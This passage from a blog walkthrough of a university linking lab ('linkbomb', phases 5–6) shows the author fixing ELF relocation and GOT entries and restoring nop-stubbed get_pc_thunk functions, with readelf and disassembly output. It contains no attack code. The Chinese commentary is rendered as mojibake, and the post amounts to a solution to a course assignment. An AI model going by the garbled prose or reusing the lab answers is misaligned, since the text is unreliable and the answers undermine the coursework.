do_phase</span><br></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥æŠŠä»–encode_2çš„é‡å®šä½ä¿¡æ¯æ”¹æˆencode_1å°±å¥½äº†ï¼Œè¿™æ ·è°ƒç”¨encode_2çš„ä¹Ÿå°±æ˜¯encode_1äº†</p><p><img src="/2023/05/08/ics4-linklab/image-20230507222739182.png" alt="image-20230507222739182"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507222657681.png" alt="image-20230507222657681"></p><p>æ¬§å…‹äº†</p><h4 id="encode-1"><a href="#encode-1" class="headerlink" title="encode_1"></a>encode_1</h4><p>è¿è¡Œä¸€ä¸‹ï¼Œé¢ï¼Œencode_1æŠ¥é”™äº†ï¼Œä¸è¿‡ä¹Ÿè¯´æ˜æ–¹å‘å¯¹äº†</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223022320.png" alt="image-20230507223022320"></p><p>ä¸è¿‡é‡å®šä½ä»€ä¹ˆå‘¢</p><p>çœ‹äº†ä¸‹encode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507223526485.png" alt="image-20230507223526485"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507223541678.png" alt="image-20230507223541678"></p><p>ä»–å¡«äº†AycPNh,æˆ‘ä»¬ä¹Ÿå¡«è¿™ä¸ªè¯•è¯•çœ‹æŠŠ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">159</span>:    <span class="number">0f</span> b6 <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movzbl <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><p>0x159+3&#x3D;15C  17&#x3D;0x11</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">%?%<span class="number">00</span>##Y?</span><br></pre></td></tr></table></figure><p>é¢ï¼Œåé¢æˆ‘è¯•å…‰äº†æ‰€ä»¥å˜é‡ç¬¦å·ï¼Œéƒ½æ²¡æœ‰å’Œpdfé‡Œä¸€æ ·çš„è¾“å‡ºï¼Œå°±è¿™æ ·æŠŠï¼Œåæ­£å·²ç»é‡å®šä½äº†7å¤„</p><p>é‡å®šä½å®Œåçš„é‡å®šä½è¡¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00000f</span>02 R_386_PC32        <span class="number">0000005</span>d   transform_code</span><br><span class="line"><span class="number">0000009</span>a  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>ab  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000000</span>dd  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000024</span>e  <span class="number">00001501</span> R_386_32          <span class="number">00000110</span>   encoder</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000263</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">0000015</span>c  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><h2 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h2><p>ä¸»è¦ç”¨åˆ°çš„çŸ¥è¯† <a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [SIGSEGV]&gt; readelf -r phase6.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>ç¬¦å·è¡¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase6.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">42</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase6.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">7</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">9</span> .data.rel.local</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> .data.rel</span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">13</span> .text.__x86.get_[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">14</span> .text.__x86.get_[...]</span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">16</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line">    <span class="number">11</span>: <span class="number">00000102</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L6</span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">17</span> .eh_frame</span><br><span class="line">    <span class="number">13</span>: <span class="number">0000008b</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L14</span><br><span class="line">    <span class="number">14</span>: <span class="number">00000090</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L13</span><br><span class="line">    <span class="number">15</span>: <span class="number">000000</span>a6     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L12</span><br><span class="line">    <span class="number">16</span>: <span class="number">000000b</span>9     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L11</span><br><span class="line">    <span class="number">17</span>: <span class="number">000000</span>cd     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L10</span><br><span class="line">    <span class="number">18</span>: <span class="number">000000</span>de     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L9</span><br><span class="line">    <span class="number">19</span>: <span class="number">000000f</span>1     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L7</span><br><span class="line">    <span class="number">20</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">15</span> .comment</span><br><span class="line">    <span class="number">21</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .group</span><br><span class="line">    <span class="number">22</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> .group</span><br><span class="line">    <span class="number">23</span>: <span class="number">00000000</span>   <span class="number">158</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> cjHQHR</span><br><span class="line">    <span class="number">24</span>: <span class="number">00000000</span>    <span class="number">88</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> OOtZxJJdNH</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">13</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">26</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">27</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">9</span> phase_id</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000</span>a0    <span class="number">10</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> tqdzfNje</span><br><span class="line">    <span class="number">29</span>: <span class="number">00000020</span>    <span class="number">52</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> yAnKQn</span><br><span class="line">    <span class="number">30</span>: <span class="number">000000</span>ac     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> aQSEth</span><br><span class="line">    <span class="number">31</span>: <span class="number">00000058</span>   <span class="number">179</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> transform_code</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000010b</span>    <span class="number">89</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> generate_code</span><br><span class="line">    <span class="number">33</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.bx</span><br><span class="line">    <span class="number">34</span>: <span class="number">00000080</span>   <span class="number">128</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> AycPNh</span><br><span class="line">    <span class="number">35</span>: <span class="number">00000164</span>   <span class="number">156</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_1</span><br><span class="line">    <span class="number">36</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">strlen</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">00000200</span>   <span class="number">155</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_2</span><br><span class="line">    <span class="number">38</span>: <span class="number">00000000</span>     <span class="number">8</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> encoder</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000029b</span>    <span class="number">82</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> do_phase</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">puts</span></span><br><span class="line">    <span class="number">41</span>: <span class="number">00000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> phase</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå‘¢ä»–çš„getpcå‡½æ•°éƒ½æ˜¯nopï¼Œæ‰€ä»¥éœ€è¦å…ˆä¿®å¤è¿™ä¸ª</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br></pre></td></tr></table></figure><p>ä¿®å¤å</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">1</span>c <span class="number">24</span>                mov    (%esp),%ebx</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br></pre></td></tr></table></figure><h4 id="generate-code-1"><a href="#generate-code-1" class="headerlink" title="generate_code"></a>generate_code</h4><p>ç¬¬ä¸€ä¸ªé”™è¯¯</p><p><img src="/2023/05/08/ics4-linklab/image-20230507232413843.png" alt="image-20230507232413843"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507232536405.png" alt="image-20230507232536405"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507233555928.png" alt="image-20230507233555928"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000010b</span> &lt;generate_code&gt;:</span><br><span class="line"> <span class="number">10b</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">10</span>c:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">53</span>                   push   %ebx</span><br><span class="line"> <span class="number">10f</span>:    <span class="number">83</span> ec <span class="number">14</span>             sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">112</span>:    e8 fc ff ff ff       call   <span class="number">113</span> &lt;generate_code+<span class="number">0x8</span>&gt; <span class="comment">//__x86.get_pc_thunk.bx</span></span><br><span class="line"> <span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"> <span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">8b</span> <span class="number">55</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%edx</span><br><span class="line"> <span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">128</span>:    c7 <span class="number">45</span> f4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">12f</span>:    eb <span class="number">25</span>                jmp    <span class="number">156</span> &lt;generate_code+<span class="number">0x4b</span>&gt;</span><br><span class="line"> <span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">137</span>:    <span class="number">8b</span> <span class="number">00</span>                mov    (%eax),%eax</span><br><span class="line"> <span class="number">139</span>:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">13</span>c:    ff <span class="number">75</span> f4             push   <span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">13f</span>:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">140</span>:    e8 fc ff ff ff       call   <span class="number">141</span> &lt;generate_code+<span class="number">0x36</span>&gt;</span><br><span class="line"> <span class="number">145</span>:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">148</span>:    <span class="number">89</span> c2                mov    %eax,%edx</span><br><span class="line"> <span class="number">14</span>a:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">150</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">152</span>:    <span class="number">83</span> <span class="number">45</span> f4 <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">156</span>:    <span class="number">8b</span> <span class="number">45</span> f4             mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">159</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">15</span>c:    <span class="number">76</span> d3                jbe    <span class="number">131</span> &lt;generate_code+<span class="number">0x26</span>&gt;</span><br><span class="line"> <span class="number">15</span>e:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">15f</span>:    <span class="number">8b</span> <span class="number">5</span>d fc             mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line"> <span class="number">162</span>:    c9                   leave  </span><br><span class="line"> <span class="number">163</span>:    c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br></pre></td></tr></table></figure><p>å¤±è´¥çš„åŸå› æ˜¯eaxé‡Œçš„å†…å®¹æ˜¯0x2ï¼Œå¾€ä¸Šæº¯æºï¼Œé€šè¿‡ä¹‹å‰åœ¨åŠ¨æ€é“¾æ¥é‡Œçš„å­¦ä¹ ,èƒ½å¤Ÿå‘ç°ä¸‹é¢ä¸¤å¥æ˜¯å…³é”®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"><span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p><code> 117:81 c3 02 00 00 00    add    $0x2,%ebx</code>è¿™å¥è‚¯å®šæ˜¯åœ¨æ‰¾é‡å®šä½gotè¡¨çš„ä½ç½®</p><p><code>11d:8b 83 00 00 00 00      mov    0x0(%ebx)</code>æ˜¯åœ¨æ ¹æ®åç§»æ‰¾å˜é‡åœ¨gotè¡¨é‡Œçš„ä½ç½®</p><p>ä¸‹é¢è¿™å¥ä¹Ÿä¸€æ ·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p>ä»¿ç…§ä¸‹é¢å»å†™goté‡å®šä½å°±è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000002</span>a9  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">19</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>åœ¨goté‡Œæ‰¾åç§»çš„å°±æ ¹æ®ä¸‹é¢è¿™ä¸ªå»æ”¹å†™</p><p><code> 14a:8b 83 00 00 00 00    mov    0x0(%ebx),%eax</code>è¿™å¥å·²ç»è¢«é‡å®šä½è¿‡äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1F</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">33</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h4 id="transform-code-1"><a href="#transform-code-1" class="headerlink" title="transform_code"></a>transform_code</h4><p><img src="/2023/05/08/ics4-linklab/image-20230508011418971.png" alt="image-20230508011418971"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000058</span> &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">58</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">59</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">5b</span>:    e8 fc ff ff ff       call   <span class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line">  <span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">65</span>:    <span class="number">8b</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%edx</span><br><span class="line">  <span class="number">6b</span>:    <span class="number">8b</span> <span class="number">4</span>d <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%ecx</span><br><span class="line">  <span class="number">6</span>e:    <span class="number">8b</span> <span class="number">14</span> <span class="number">8</span>a             <span class="title function_">mov</span>    <span class="params">(%edx,%ecx,<span class="number">4</span>)</span>,%edx</span><br><span class="line">  71:    83 e2 07             and    $0x7,%edx</span><br><span class="line">  74:    83 fa 07             cmp    $0x7,%edx</span><br><span class="line">  77:    0f 87 85 00 00 00    ja     102 &lt;.L6&gt;</span><br><span class="line">  7d:    c1 e2 02             shl    $0x2,%edx</span><br><span class="line">  80:    8b 94 02 54 00 00 00 mov    0<span class="title function_">x54</span><span class="params">(%edx,%eax,<span class="number">1</span>)</span>,%edx</span><br><span class="line">  87:    01 c2                add    %eax,%edx</span><br><span class="line">  89:    ff e2                jmp    *%edx</span><br><span class="line"></span><br><span class="line">0000008b &lt;.L14&gt;:</span><br><span class="line">  8b:    f7 55 08             notl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  8e:    eb 76                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000090 &lt;.L13&gt;:</span><br><span class="line">  90:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  96:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  99:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  9c:    83 e0 03             and    $0x3,%eax</span><br><span class="line">  9f:    89 c1                mov    %eax,%ecx</span><br><span class="line">  a1:    d3 7d 08             sarl   %cl,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  a4:    eb 60                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000a6 &lt;.L12&gt;:</span><br><span class="line">  a6:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  ac:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  af:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span 